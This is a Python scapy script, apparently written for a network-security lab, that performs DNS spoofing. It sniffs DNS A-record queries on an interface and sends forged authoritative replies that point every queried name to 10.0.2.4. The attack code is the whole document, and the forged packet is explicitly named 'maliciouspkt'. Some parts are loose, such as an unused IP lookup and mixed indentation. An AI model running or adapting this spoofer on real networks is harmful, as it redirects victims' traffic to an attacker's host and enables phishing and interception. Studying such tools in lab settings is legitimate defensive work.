from scapy.all import *
import getopt
import socket
import fcntl
import struct

def get_myip(interface):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(
		s.fileno(),
		0x8915,
		struct.pack('256s',interface[:15])
		)[20:24])

def readFromFile(filename):
	print("filename: " + filename)
	f = open(filename, "r")
	return f.readlines()

def spoofer(packet2):
	
	if packet2.haslayer(DNSQR):
		get_myip('eth0')
		if(packet2[DNS].qr == 0 and packet2[DNSQR].qtype == 1):
			# reverse dst/src ip & src/dst ports
		 	maliciouspkt = Ether(dst=packet2[Ether].src, src=packet2[Ether].dst, type=packet2[Ether].type)/\
		 		IP(dst=packet2[IP].src, src=packet2[IP].dst) /\
		 		UDP(dport=packet2[UDP].sport, sport=packet2[UDP].dport) /\
		 		DNS(id=packet2[DNS].id, qr=1, aa=1, qd=packet2[DNS].qd, qdcount=1,ancount=1,\
		 			an=DNSRR(rrname=packet2[DNS].qd.qname, ttl=2000, rdata="10.0.2.4", type=1))
		 	sendp(maliciouspkt)

if __name__== "__main__":
	argumentList = sys.argv[1:] 
	options = "i:f:"
	fflag = 0
	iflag = 0
	interface = ""
	expression = ""


	try: 
	    # Parsing argument 
	    arguments, values = getopt.getopt(argumentList, options) 

	    if len(argumentList)%2 == 1:
	        expression = argumentList[-1]
	      
	    # checking each argument 
	    for currentArgument, currentValue in arguments: 
	  
	        if currentArgument in ("-f"): 
	            fflag = 1
	            lines = readFromFile(currentValue)
	            
	        if currentArgument in ("-i"): 
	            iflag = 1
	            interface = currentValue
	            print("interface: " + interface)
	            if not (interface == "lo" or interface == "eth0"):
	                print("'" + interface + "' interface not available. Choose from: [eth0, lo]")
	                exit()
	              
	except (getopt.error, OSError) as err: 
	    # output error, and return with an error code 
	    print(str(err))
	    exit()

	if fflag == 1:
		for line in lines:
			print(line)

	sniff(prn=spoofer, count=0)
	print("end of main")
	exit()

